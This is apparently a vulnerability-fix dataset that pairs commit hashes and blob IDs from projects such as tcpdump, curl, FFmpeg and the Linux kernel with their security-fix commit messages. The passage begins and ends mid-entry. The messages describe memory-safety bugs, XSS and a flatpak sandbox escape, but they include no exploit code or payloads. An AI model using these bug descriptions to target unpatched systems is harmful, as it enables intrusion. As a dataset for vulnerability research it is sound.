Commit Message for 9ba91381954ad325ea4fd26b9c65a8bd9a2a85b6:
(for 4.9.3) CVE-2018-14879/fix -V to fail invalid input safely\n\nget_next_file() did not check the return value of strlen() and underflowed an array index if the line read by fgets() from the file started with \0. This caused an out-of-bounds read and could cause a write. Add the missing check.\n\nThis vulnerability was discovered by Brian Carpenter & Geeknik Labs.

======================================================================
Commit With Fix: 
    71aaeaf020340412b8d012fe23a556c0420eda5f
File(s) In Commit: 
    pango/pango-emoji.c
Blob(s) In Commit: 
    29472452dd3855faeb22c900dbe4c41226f7f90c
Blob(s) Before Fix: 
    0e332dff1d564da91721a28946c494c78c480eb1
Projects:
    GNOME_pango
Commit Message for 71aaeaf020340412b8d012fe23a556c0420eda5f:
Prevent an assertion with invalid Unicode sequences\n\nInvalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f, can trick the Emoji iter code into returning an empty segment, which then triggers an assertion in the itemizer.\n\nPrevent this by ensuring that we make progress.\n\nThis issue was reported by Jeffrey M.

======================================================================
Commit With Fix: 
    ef111822562d0b9365bd3e671a75b65bd0613353
File(s) In Commit: 
    javamelody-core/src/main/java/net/bull/javamelody/PayloadNameRequestWrapper.java
Blob(s) In Commit: 
    f03c1419f1eb8c6efe68758b182c227f03ff150e
Blob(s) Before Fix: 
    a6c4e3d35fe517fe3e5de503c000ad4a62c55702
    c2affb3bc1fc2cc02f4ab03bf7ca2d334af0150c
Projects:
    06094051_javamelody
Commit Message for ef111822562d0b9365bd3e671a75b65bd0613353:
fix for security

======================================================================
Commit With Fix: 
    af2cf04a9394c1a56227c2289ae8da262828294a
File(s) In Commit: 
    print-bgp.c
Blob(s) In Commit: 
    7db3c6bb0f93931a2cdddae9ff55cdf544dac2f5
Blob(s) Before Fix: 
    c82f1cc7df10d580f892b77297b307739e41202d
    e9b4c2bd9c8d18cb26b838715651ee768e7e757d
Projects:
    0xmitsurugi_tcpdump
Commit Message for af2cf04a9394c1a56227c2289ae8da262828294a:
(for 4.9.3) CVE-2018-16300/BGP: prevent stack exhaustion\n\nEnforce a limit on how many times bgp_attr_print() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.

======================================================================
Commit With Fix: 
    e5bb5297f68e56537c004cdbb48a30892e9f6f4c
File(s) In Commit: 
    e107_web/js/plupload/upload.php
Blob(s) In Commit: 
    12c33646a5ba1162a662b587f31efd2996a32095
Blob(s) Before Fix: 
    3802fdfb18c3a8a7b9693c4bc7edecd397a8f383
Projects:
    Alex-e107nl_e107
Commit Message for e5bb5297f68e56537c004cdbb48a30892e9f6f4c:
plupload fix.

======================================================================
Commit With Fix: 
    ec483e9379aa622bfcc1b853b189c74288771f27
File(s) In Commit: 
    e107_admin/banlist.php
Blob(s) In Commit: 
    591de39c046e760e1ce144a7f07f7d550c6cd658
Blob(s) Before Fix: 
    92bbaa17b219bdc3d7ddf48f3c96c24ac4ed0dd8
    ea564bd3bb79adf8c465e825f4b1576417224201
Projects:
    Alex-e107nl_e107
Commit Message for ec483e9379aa622bfcc1b853b189c74288771f27:
Code cleanup

======================================================================
Commit With Fix: 
    96480ab95308cd9234b4f09b175ebf60e17792c6
File(s) In Commit: 
    print-smb.c
Blob(s) In Commit: 
    944b8d28abfc0c4dc723f477c9e794fcb9f79ac0
Blob(s) Before Fix: 
    5af01aea06d55eee4a4abce331ebc421cf9b6476
    723b9a032415c00f1503db0b5334e13bdb301a80
Projects:
    0xmitsurugi_tcpdump
Commit Message for 96480ab95308cd9234b4f09b175ebf60e17792c6:
(for 4.9.3) SMB: Add two missing bounds checks

======================================================================
Commit With Fix: 
    24182d959f661327525a20d9a94c98a8ec016778
File(s) In Commit: 
    smbutil.c
Blob(s) In Commit: 
    7b01f487dbc2de43cb1cdb19c5a017866d27d80d
Blob(s) Before Fix: 
    fc9b3cc6f227a659fd71f3c5e4c1c766a132e9a3
Projects:
    0xmitsurugi_tcpdump
Commit Message for 24182d959f661327525a20d9a94c98a8ec016778:
(for 4.9.3) CVE-2018-16452/SMB: prevent stack exhaustion\n\nEnforce a limit on how many times smb_fdata() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.

======================================================================
Commit With Fix: 
    f3a24d7916b9173c69a3e0ee790102993833d6c5
File(s) In Commit: 
    lib/vauth/cleartext.c
Blob(s) In Commit: 
    be6d6111e22e20f0eed3c67e4e1e865654186459
Blob(s) Before Fix: 
    4e906bc0762f76ef7a86ebf385526221802cf862
    5d61ce6dc2e5e924a3d95aeed0fcdd9128f8e973
    6f452c16942242359c3d1ed538cfd9b911bc9fd2
    a10edbdc742bcaccdd6ae2878e36a41a8a46919a
    a761ae7846616104b46e2514852ecdc1a3848a47
Projects:
    0ca_curl
Commit Message for f3a24d7916b9173c69a3e0ee790102993833d6c5:
Curl_auth_create_plain_message: fix too-large-input-check\n\nCVE-2018-16839 Reported-by: Harry Sintonen Bug: https://curl.haxx.se/docs/CVE-2018-16839.html

======================================================================
Commit With Fix: 
    81d135d67155c5295b1033679c606165d4e28f3f
File(s) In Commit: 
    lib/url.c
Blob(s) In Commit: 
    0d5a13f99639b2444a8a1b1eeadf9be2fe036fd0
Blob(s) Before Fix: 
    701f83ab3bff4c59951eaed3a728fd3e1b2adaec
    723b898065ee9b80419a6ec78049cf7a8d9d44b1
    74813e8746f7c5b5f72d9fb51162fb9fff9500d3
    87446dbca3a48b99b371e776f7f7b0b775cb206e
    e547e5c16215a4d020859d48b96741a59485feb0
    f159008898b151a48f617510da7270a21104fbbf
Projects:
    0ca_curl
Commit Message for 81d135d67155c5295b1033679c606165d4e28f3f:
Curl_close: clear data->multi_easy on free to avoid use-after-free\n\nRegression from b46cfbc068 (7.59.0) CVE-2018-16840 Reported-by: Brian Carpenter (Geeknik Labs)\n\nBug: https://curl.haxx.se/docs/CVE-2018-16840.html

======================================================================
Commit With Fix: 
    d530e92f59ae9bb2d47066c3c460b25d2ffeb211
File(s) In Commit: 
    src/tool_msgs.c
Blob(s) In Commit: 
    f5e1df25fb42703531d17f0dee3e2da6b40c8bae
Blob(s) Before Fix: 
    07bf81292c8b7c601bab568f97af50f0717812e8
    1454903ad4e3348e97af5d82296e6e2958b9b202
    3311b55f5fea35ba73bb8d424bef62dbb90fdd7f
    80fdf4e27bb6f331cb4b4bb0bdf73d86221aeeb8
    832ed8147b4c33c04aadea7b04129c9755b8af6d
    91d62ec1ed9ec732f92942e1fd9ee30f43fe5374
    9cce8063e6dbb77ecb48267c7d46b1df2b9ded00
    d06708a1885712667fb8ba48a02204009aa6daed
Projects:
    0ca_curl
Commit Message for d530e92f59ae9bb2d47066c3c460b25d2ffeb211:
voutf: fix bad arethmetic when outputting warnings to stderr\n\nCVE-2018-16842 Reported-by: Brian Carpenter Bug: https://curl.haxx.se/docs/CVE-2018-16842.html

======================================================================
Commit With Fix: 
    ffd668a3aa7d2f540dbcdf5751f207302519df72
File(s) In Commit: 
    core/admin/ajax/file-browser/upload.php
Blob(s) In Commit: 
    5453dec7fe5786da7de8468ba5bc7508d061197d
Blob(s) Before Fix: 
    414e241209fa7a7561d0616c33a10ba86f68bfa9
Projects:
    4v4t4r_BigTree-CMS
Commit Message for ffd668a3aa7d2f540dbcdf5751f207302519df72:
Fixing XSS on file names that fail to upload

======================================================================
Commit With Fix: 
    34716e2a6ee2af96078d62b065b7785c001194be
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    c5c7becc0f1280bfdaba04d09ed95213ad6fdd08
Blob(s) Before Fix: 
    7282dd9cfec19624ef8e498dfe6394bfbcbca69c
Projects:
    1nickt_perl5
Commit Message for 34716e2a6ee2af96078d62b065b7785c001194be:
Perl_my_setenv()  handle integer wrap\n\nRT #133204\n\nWean this function off int/I32 and onto UV/Size_t. Also, replace all malloc-ish calls with a wrapper that does overflow checks,\n\nIn particular, it was doing (nlen + vlen + 2) which could wrap when the combined length of the environment variable name and value exceeded around 0x7fffffff.\n\nThe wrapper check function is probably overkill, but belt and braces...\n\nNB this function has several variant parts, #ifdef'ed by platform type  I have blindly changed the parts that aren't compiled under linux.

======================================================================
Commit With Fix: 
    43b2f4ef399e2fd7240b4eeb0658686ad95f8e62
File(s) In Commit: 
    regcomp.c
Blob(s) In Commit: 
    9aec81ddfa3e134637bd33ee08ba162445b5f0bd
Blob(s) Before Fix: 
    892aed82cdf71405b6df825ef0e4a9820e9977cd
    94e1eb5ecb49e0e450d395bcf501aa8714644e20
    af1ec37348132a3510dbcb1508b01bec5ee1e7f1
    cc0ff96064ba30e7f2ac87f042daeee875427758
Projects:
    1nickt_perl5
Commit Message for 43b2f4ef399e2fd7240b4eeb0658686ad95f8e62:
regcomp.c: Convert some strchr to memchr\n\nThis allows things to work properly in the face of embedded NULs. See the branch merge message for more information.

======================================================================
Commit With Fix: 
    c69402c4764ed9a76301c57277aefe70141b6418
File(s) In Commit: 
    core/inc/bigtree/admin.php
Blob(s) In Commit: 
    d91d4665131d6c8e71c761c73cd597b2bd332905
Blob(s) Before Fix: 
    7985374abaa2dbd09121380eb7848f44b6ca400e
Projects:
    4v4t4r_BigTree-CMS
Commit Message for c69402c4764ed9a76301c57277aefe70141b6418:
Regenerating session IDs on login state change. Thanks to Juttikhun Khamchaiyaphum for the suggestion.

======================================================================
Commit With Fix: 
    cced03dd667a5df6df8fd40d8de0bff477ee02e8
File(s) In Commit: 
    libavformat/mms.c
Blob(s) In Commit: 
    768fda652543b482eb6a702fa9b39f0032858122
Blob(s) Before Fix: 
    16babc095424726e0430ef0465b3b7d5919e4e63
    17fa76a8d44d67f32acfae3b81def50ae6e1536b
    7e60b3bec60eb0a81a566b2414faf50308d9eed0
    807aadef0f8f5ad03a18ededabf1fd304c693409
    9f675f2dd0cc1cc95b0058d2afb0bbbb3277d1c2
    9ff05351614ded3c9cc246792186f4ccff0021cc
    fc967c189226eccbdf179b4c347524f722bb8607
Projects:
    00ERNEST00_FFmpeg
Commit Message for cced03dd667a5df6df8fd40d8de0bff477ee02e8:
avformat/mms: Add missing chunksize check\n\nFixes: out of array read Fixes: mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816a\n\nFound-by: Paul Ch <paulcher@icloud.com> 1st hunk by Paul Ch <paulcher@icloud.com> Tested-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    2b46ebdbff1d8dec7a3d8ea280a612b91a582869
File(s) In Commit: 
    libavformat/asfdec_o.c
Blob(s) In Commit: 
    b4b2698368fc66cc13d7f6d41f3b21312bcd5de0
Blob(s) Before Fix: 
    2320c661cdc187b69ff75aa5b08529e035edcfa1
    5122e33c7870653e3f8c946d02f547c4973b6305
    56f8446b5ff6e398375f6d8bbe3ddd196d69afdf
    8e7f044ce91432aaf364e8262d8e2a4391b582ce
    cf2a01e6dbf605e904d4ff7c4dbed67635cb0e7e
    d8c4869cc1c2cb43a2188579f06f7c8947e349ef
    f7000b0413525a6777e84a73e8677b436ba7ccd3
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2b46ebdbff1d8dec7a3d8ea280a612b91a582869:
avformat/asfdec_o: Check size_bmp more fully\n\nFixes: integer overflow and out of array access Fixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9807d3976be0e92e4ece3b4b1701be894cd7c2e1
File(s) In Commit: 
    libavformat/pva.c
Blob(s) In Commit: 
    04ae8e2800cce1cd203d712929bb96c4b1f50ea6
Blob(s) Before Fix: 
    16381db9054f4062b5486e11d0bb17914f33adc7
    458d21995f08538da3983fc2d60699293b7d0c73
    58ec78750cf90dc9f79355790a4ec71c15e3443b
    900ad6133d1a352ec2eab2424ab7847693f27762
    9714fb186c330bcca6c730d5d730d72362bdf806
    abbc6f1c60cfa92b8cf6e72b1c52ee0bdfecb6e8
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9807d3976be0e92e4ece3b4b1701be894cd7c2e1:
avformat/pva: Check for EOF before retrying in read_part_of_packet()\n\nFixes: Infinite loop Fixes: pva-4b1835dbc2027bf3c567005dcc78e85199240d06\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    a7e032a277452366771951e29fd0bf2bd5c029f0
File(s) In Commit: 
    libavformat/rmdec.c
Blob(s) In Commit: 
    0216003e88e46a52c254cb1a6fa4f7099f3a3414
Blob(s) Before Fix: 
    ac61723c66acc9355026a9a8d74adb8c03264ad3
    d6d7d9cd8414da5030021d513eebf943c69238ca
    f26c5b4d90712e4c94dc06f446ffc9dbbe8d7e5b
    f4603bfb92fdc4bebb6f9ce4ae24f9dc9e961f9a
    fea71a2fc9715fe676fcddc4faed2df524ddf62d
Projects:
    00ERNEST00_FFmpeg
Commit Message for a7e032a277452366771951e29fd0bf2bd5c029f0:
avformat/rmdec: Do not pass mime type in rm_read_multi() to ff_rm_read_mdpr_codecdata()\n\nFixes: use after free() Fixes: rmdec-crash-ffe85b4cab1597d1cfea6955705e53f1f5c8a362\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    3a8e76e51ce2d5dd1682ec87b88dce70f20db721
Blob(s) Before Fix: 
    7a4255556219027e0e8515e0b4f513f70500d3a9
    b76beb962f4a8ea9ed55acb344ab7c4c2a647b1f
Projects:
    00ERNEST00_FFmpeg
Commit Message for bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75:
avformat/mxfdec: Fix av_log context\n\nFixes: out of array access Fixes: mxf-crash-1c2e59bf07a34675bfb3ada5e1ec22fa9f38f923\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    5aba5b89d0b1d73164d3b81764828bb8b20ff32a
File(s) In Commit: 
    libavcodec/mpeg4videodec.c
Blob(s) In Commit: 
    24c280df4658df04ebdfaea6c37b993533e4cbf0
Blob(s) Before Fix: 
    19210d97fe66546b130ea36bc81d484948b71887
    2df525e03a781a24682e10d1e41adf57d8a50865
    319a3809ea56662f631a4336ab30388f327602d0
    32eb3d1ca8d6762b79009ee2c650ae41b0ea0f8b
    54a84962444f4935fe874734ef769a7fcb485497
    9ee2f37c6947785c17c75dcf6838aa0ede514c50
    d0ebaac6e8e8c653bde7250714ee56dc00ed5969
    f435a520c8b4201b50d5387d87e6abf5e5a4329d
    fa69c9ef87e3aadeb17a67f640db6df9622db569
Projects:
    00ERNEST00_FFmpeg
Commit Message for 5aba5b89d0b1d73164d3b81764828bb8b20ff32a:
avcodec/mpeg4videodec: Check for bitstream end in read_quant_matrix_ext()\n\nFixes: out of array read Fixes: asff-crash-0e53d0dc491dfdd507530b66562812fbd4c36678\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    1aaf2182a6b722ad539e2717bc11967d1bde723a
File(s) In Commit: 
    app/org/thp/cortex/controllers/UserCtrl.scala
Blob(s) In Commit: 
    3e2124bfb6d1cc2a6c9f85c15f73f73978017074
Blob(s) Before Fix: 
    7db3d66f177ff947ec1ad0d3fc6344312a550736
    8277fdff0325cfcb75c3fa0a2ef8a14053ff1bd3
Projects:
    3c7_Cortex
Commit Message for 1aaf2182a6b722ad539e2717bc11967d1bde723a:
#158 Fix checks in user creation

======================================================================
Commit With Fix: 
    6d60bc8ed010c4eda05d6645c64849f415f68d65
File(s) In Commit: 
    app/helpers/tags_helper.rb
Blob(s) In Commit: 
    397977682fc6b91f72d926a9d068f805a061fc3d
Blob(s) Before Fix: 
    266060c6eafa7deea94661ef35e84ac9dad15742
Projects:
    0bserver07_fat_free_crm
Commit Message for 6d60bc8ed010c4eda05d6645c64849f415f68d65:
Context-sensitive XSS bugfix.

======================================================================
Commit With Fix: 
    c095508770aebf1b9218e77026e48345d719b17c
File(s) In Commit: 
    net/rds/rdma.c
Blob(s) In Commit: 
    94729d9da43721b49e01b8d85a30e12bad5294cb
Blob(s) Before Fix: 
    8886f15abe90e16005d7e02f3514476c68d2b0db
    bc2f1e0977d657ec09f176cfcecf28839eb1fab0
    f06fac4886b090f346090ac26dad8e1eaa8da471
Projects:
    0-T-0_ps4-linux
Commit Message for c095508770aebf1b9218e77026e48345d719b17c:
RDS: Heap OOB write in rds_message_alloc_sgs()\n\nWhen args->nr_local is 0, nr_pages gets also 0 due some size calculation via rds_rm_size(), which is later used to allocate pages for DMA, this bug produces a heap Out-Of-Bound write access to a specific memory region.\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7d11f77f84b27cef452cee332f4e469503084737
File(s) In Commit: 
    net/rds/rdma.c
Blob(s) In Commit: 
    634cfcb7bba6833bde376706947c99f1cb103199
Blob(s) Before Fix: 
    0d4e6905615df165bdd08600bbebdaac15246cce
    182ab8430594a967533fe64b44ebe41a97fab83c
    398932fbaf2762d8aa5884dac8c3004ae5b4ddd5
    40084d843e9fe33bc1545f1f573a32780880e223
    4c93badeabf2236d3d90c933e6169174b3ba68d1
    4e37c1cbe8b2faf5928af6be551f3f5551684411
    8886f15abe90e16005d7e02f3514476c68d2b0db
    94729d9da43721b49e01b8d85a30e12bad5294cb
    98237feb607ac6f3d24ecd18ecb3320c47065d30
    bc2f1e0977d657ec09f176cfcecf28839eb1fab0
    bd4365011de3f73310fa28254bde5de2d6251fe8
    bdfc395d1be2c416ee76085c987ed59af57529cc
    e1965d9cbcf829b37c23bf009ca3c6de1e6f09a9
    ea961144084fadb3ee98abd708ce5cd31eba42a5
    f06fac4886b090f346090ac26dad8e1eaa8da471
    f6027f41cd34c9f50fe75eac0cdbc6beab5f1658
Projects:
    0-T-0_ps4-linux
Commit Message for 7d11f77f84b27cef452cee332f4e469503084737:
RDS: null pointer dereference in rds_atomic_free_op\n\nset rm->atomic.op_active to 0 when rds_pin_pages() fails or the user supplied address is invalid, this prevents a NULL pointer usage in rds_atomic_free_op()\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c0f326d05231072e33679b84835c03d5043255cb
File(s) In Commit: 
    setup/classes/class.ilSetupGUI.php
Blob(s) In Commit: 
    36682dbfc9afa41d4b581ad18f6291506c3b8ed6
Blob(s) Before Fix: 
    7b600ed250cba8264ce8887cf63ced0f43e1c1f6
Projects:
    09132100935_ILIAS
Commit Message for c0f326d05231072e33679b84835c03d5043255cb:
Fixed output of "cmd" parameter\n\n(cherry picked from commit 2106df4)

======================================================================
Commit With Fix: 
    073c516ff73557a8f7315066856c04b50383ac34
File(s) In Commit: 
    fs/nsfs.c
Blob(s) In Commit: 
    323f492e0822dd3286365d5cdbe56c59ec2d5463
Blob(s) Before Fix: 
    08127a2b8559ab9660b7dcced023770ff8588c59
    1656843e87d2bef47b69d65b23c23946e8936f33
    8718af895eabf791451e1b607d7b0a2b2d33cef2
    8c9fb29c667327549737a6a9b6440d2564c7c710
    8f20d6016e205d341b82e31025961e8c9f6c6963
    9ee8ac7395c923a8bf81bd7ce4c7e03f31388e14
Projects:
    0-T-0_ps4-linux
Commit Message for 073c516ff73557a8f7315066856c04b50383ac34:
nsfs: mark dentry with DCACHE_RCUACCESS\n\nAndrey reported a use-after-free in __ns_get_path():\n\n  spin_lock include/linux/spinlock.h:299 [inline]   lockref_get_not_dead+0x19/0x80 lib/lockref.c:179   __ns_get_path+0x197/0x860 fs/nsfs.c:66   open_related_ns+0xda/0x200 fs/nsfs.c:143   sock_ioctl+0x39d/0x440 net/socket.c:1001   vfs_ioctl fs/ioctl.c:45 [inline]   do_vfs_ioctl+0x1bf/0x1780 fs/ioctl.c:685   SYSC_ioctl fs/ioctl.c:700 [inline]   SyS_ioctl+0x8f/0xc0 fs/ioctl.c:691\n\nWe are under rcu read lock protection at that point:\n\n        rcu_read_lock()          d = atomic_long_read(&ns->stashed)          if (!d)                 goto slow          dentry = (struct dentry *)d          if (!lockref_get_not_dead(&dentry->d_lockref))                 goto slow          rcu_read_unlock() \n\nbut don't use a proper RCU API on the free path, therefore a parallel __d_free() could free it at the same time.  We need to mark the stashed dentry with DCACHE_RCUACCESS so that __d_free() will be called after all readers leave RCU.\n\nFixes: e149ed2b805f ("take the targets of /proc/*/ns/* symlinks to separate fs") Cc: Alexander Viro <viro@zeniv.linux.org.uk> Cc: Andrew Morton <akpm@linux-foundation.org> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    8354763b90490d4105695df52674d0fcef823e92
File(s) In Commit: 
    table.c
Blob(s) In Commit: 
    4f193e155b1772e0f0d03b7c2366bab7e2e310be
Blob(s) Before Fix: 
    221db9263607cb13ba15d327aa2eddd646e004f4
Projects:
    ii0_w3m
Commit Message for 8354763b90490d4105695df52674d0fcef823e92:
Prevent negative indent value in feed_table_block_tag()\n\nBug-Debian: https://github.com/tats/w3m/issues/88

======================================================================
Commit With Fix: 
    7fdc83b0364005a0b5ed869230dd81752ba022e8
File(s) In Commit: 
    form.c
Blob(s) In Commit: 
    bc14d39fed0625e0d083454a47a59cc3c30e8921
Blob(s) Before Fix: 
    cc5e3d23667cfeafd4ec0de01ed2cca688210fa0
Projects:
    ii0_w3m
Commit Message for 7fdc83b0364005a0b5ed869230dd81752ba022e8:
Prevent invalid columnPos() call in formUpdateBuffer()\n\nBug-Debian: https://github.com/tats/w3m/issues/89

======================================================================
Commit With Fix: 
    250c6c49e3b68756b14983c076183568636e2bde
File(s) In Commit: 
    drivers/video/fbdev/sbuslib.c
Blob(s) In Commit: 
    a436d44f1b7fbf4e2fe2447de21a6aa5a4903cde
Blob(s) Before Fix: 
    01a7110e61a76a19167fae82d71e1f9efdb312e3
    31c301d6be621aef9f3a35f9bef3beb13eeff0d2
    a350209ffbd3d1d67d918872f282782f0ec6f791
    af6fc97f4ba4a5fac8cf2f100616f3cdf33a8aae
    c4f673f990180db7879913eaa3adcc9012005998
Projects:
    0-T-0_ps4-linux
Commit Message for 250c6c49e3b68756b14983c076183568636e2bde:
fbdev: Fixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbusfb_ioctl_helper().\n\nFixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbusfb_ioctl_helper().\n\n'index' is defined as an int in sbusfb_ioctl_helper(). We retrieve this from the user: if (get_user(index, &c->index) ||     __get_user(count, &c->count) ||     __get_user(ured, &c->red) ||     __get_user(ugreen, &c->green) ||     __get_user(ublue, &c->blue))        return -EFAULT \n\nand then we use 'index' in the following way: red = cmap->red[index + i] >> 8  green = cmap->green[index + i] >> 8  blue = cmap->blue[index + i] >> 8 \n\nThis is a classic information leak vulnerability. 'index' should be an unsigned int, given its usage above.\n\nThis patch is straight-forward  it changes 'index' to unsigned int in two switch-cases: FBIOGETCMAP_SPARC && FBIOPUTCMAP_SPARC.\n\nThis patch fixes CVE-2018-6412.\n\nSigned-off-by: Peter Malone <peter.malone@gmail.com> Acked-by: Mathieu Malaterre <malat@debian.org> Signed-off-by: Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>

======================================================================
Commit With Fix: 
    de686a9e6d8c909485b87ca09c8f912bf83082f2
File(s) In Commit: 
    core/current_user_api.php
Blob(s) In Commit: 
    e60e00504de5f12788447db1130bfc7d03f151e7
Blob(s) Before Fix: 
    85f854b833b434de4091c551d237ad89c43781b2
Projects:
    01-Scripts_mantisbt
Commit Message for de686a9e6d8c909485b87ca09c8f912bf83082f2:
Fix PHP error - wrong argument type\n\nInitialize $t_filter variable as array() instead of '' in current_user_get_bug_filter(), to ensure its type is correct when calling filter_ensure_valid_filter().\n\nFixes #23921

======================================================================
Commit With Fix: 
    52346bf187b5a7f1c0fe9075b328b7ad6abe78f6
File(s) In Commit: 
    dbus-proxy/flatpak-proxy.c
Blob(s) In Commit: 
    ff5fe455d19602ec34fb4d7efa69cf44280cccb3
Blob(s) Before Fix: 
    d1446efd7fdc0a3993a3bbf7981001ee83df5d55
    ee8840542be38990a372c4f6cc4683e62869dab1
Projects:
    Acidburn0zzz_flatpak
Commit Message for 52346bf187b5a7f1c0fe9075b328b7ad6abe78f6:
Fix vulnerability in dbus proxy\n\nDuring the authentication all client data is directly forwarded to the dbus daemon as is, until we detect the BEGIN command after which we start filtering the binary dbus protocol.\n\nUnfortunately the detection of the BEGIN command in the proxy did not exactly match the detection in the dbus daemon. A BEGIN followed by a space or tab was considered ok in the daemon but not by the proxy. This could be exploited to send arbitrary dbus messages to the host, which can be used to break out of the sandbox.\n\nThis was noticed by Gabriel Campana of The Google Security Team.\n\nThis fix makes the detection of the authentication phase end match the dbus code. In addition we duplicate the authentication line validation from dbus, which includes ensuring all data is ASCII, and limiting the size of a line to 16k. In fact, we add some extra stringent checks, disallowing ASCII control chars and requiring that auth lines start with a capital letter.

======================================================================
Commit With Fix: 
    b60b322cf9f0ffa624018f1bb9783edf0dc908c3
File(s) In Commit: 
    soundlib/Load_stp.cpp
Blob(s) In Commit: 
    4389a4f357c493f8c64fc488db3589b0b5cef3ca
Blob(s) Before Fix: 
    207521d7eb40b459c94070908f3c923280d27c8c
    68219a29f9c0988c57a17af3fd164f28b2c4f3e9
    9088554cb03b5eb294e14ae250e6db171c4a0ce6
Projects:
    DW01_openmpt
Commit Message for b60b322cf9f0ffa624018f1bb9783edf0dc908c3:
[Sec] STP: Possible out-of-bounds memory read with malformed STP files (caught with afl-fuzz). Patch-by: sagamusix (originally committed as part of r9568)\n\n git-svn-id: https://source.openmpt.org/svn/openmpt/branches/OpenMPT-1.27@9576 56274372-70c3-4bfc-bfc3-4c3a0b034d27

======================================================================
Commit With Fix: 
    448cd13e7b18c83855d706c564341ddd1e38e769
File(s) In Commit: 
    src/uncurl.c
Blob(s) In Commit: 
    9ea8642b597f3d58f3c4a53dc4ca42f050a5a5a2
Blob(s) Before Fix: 
    ca82af9a6e4d9924aa1331946a0706deb6e70520
Projects:
    cmuir_uncurl
Commit Message for 448cd13e7b18c83855d706c564341ddd1e38e769:
origin matching must come at str end

======================================================================
Commit With Fix: 
    d5bf76b5a88d044a1be1d5656698e3ba737167e5
File(s) In Commit: 
    cli/riff.c
Blob(s) In Commit: 
    de98c1e39fa44ad3338338a3df7d783f7adb8840
Blob(s) Before Fix: 
    8b1af45e0faa03f88756ad6a6265827b0ae84584
Projects:
    EQ4_WavPack
Commit Message for d5bf76b5a88d044a1be1d5656698e3ba737167e5:
issue #27, do not overwrite stack on corrupt RF64 file

======================================================================
Commit With Fix: 
    a03422b09468cdd5f192b05643311c705447588b
File(s) In Commit: 
    src/static/js/pad_utils.js
Blob(s) In Commit: 
    9c1277a00ce449c64a0af431025cdbe1b9096215
Blob(s) Before Fix: 
    5a7700c945549ad91513831add55407e7f15c8f4
    7166e0fb513a360d78886e92555045548e116b85
    b83f21cfe61342f3a8103cc1058f75656118b38c
    ff60ca7c6b64d0b846ddf627fbcdb819aba26b11
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for a03422b09468cdd5f192b05643311c705447588b:
Merge pull request #3313 from rhelmer/sanitize-window-location\n\nbetter sanitize window location in error messages

======================================================================
Commit With Fix: 
    64efdc4fd974c83cedd221b46e7c3854a81650ec
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    022c9885ea454ba3afd913e10ef0fd0240a67a20
Blob(s) Before Fix: 
    2acd4210de44cc331da83c3b8112fa812c460d8c
    735d3be091c847a40b6dcb98db5bdbe92cb167fc
Projects:
    xss_wondercms
Commit Message for 64efdc4fd974c83cedd221b46e7c3854a81650ec:
Update index.php\n\n- Fixed vulnerability - logged in admin could delete files from any directory (added realpath).  - Added SRI hashes to external JavaScript and CSS files: jquery.min.js, bootstrap.min.js, autosize.min.js, taboverride.min.js, jquery.taboverride.min.js, bootstrap.min.css).  - Removed uneccessarry session unset.  - Minor text changes.

======================================================================
Commit With Fix: 
    1845c0e4b1bff3462c91c3108c85205acd3c75a2
File(s) In Commit: 
    oauthenticator/gitlab.py
Blob(s) In Commit: 
    e6669c2ac423c04573f2e6c7e9b4edc8673025d4
Blob(s) Before Fix: 
    e5d9029e55969534fe43ee475bdf974b7ccb41ac
Projects:
    42n4_jupyter-dockers
Commit Message for 1845c0e4b1bff3462c91c3108c85205acd3c75a2:
Security fix: fix gitlab group whitelist check\n\ncheck group membership of users\n\npreviously, group_whitelist allowed any user who could access the groups in the whitelist, rather than checking their membership of the groups.\n\nAdmin users received the correct behavior already

======================================================================
Commit With Fix: 
    568e8db44930fda4563c1e708a2440909fd8e5fe
File(s) In Commit: 
    lib/Zonemaster/GUI/Dancer/Export.pm
Blob(s) In Commit: 
    a26278add4f172c6454c55f5339070932e9eef97
Blob(s) Before Fix: 
    2f7bbfffb2eda20e0b0baed3dae9cd8735f62a64
Projects:
    dne_zonemaster-gui
Commit Message for 568e8db44930fda4563c1e708a2440909fd8e5fe:
Escape HTML

======================================================================
Commit With Fix: 
    4f6af7f69f29df8555a18b9bb7b646906b45924d
File(s) In Commit: 
    src/SAML2/HTTPRedirect.php
Blob(s) In Commit: 
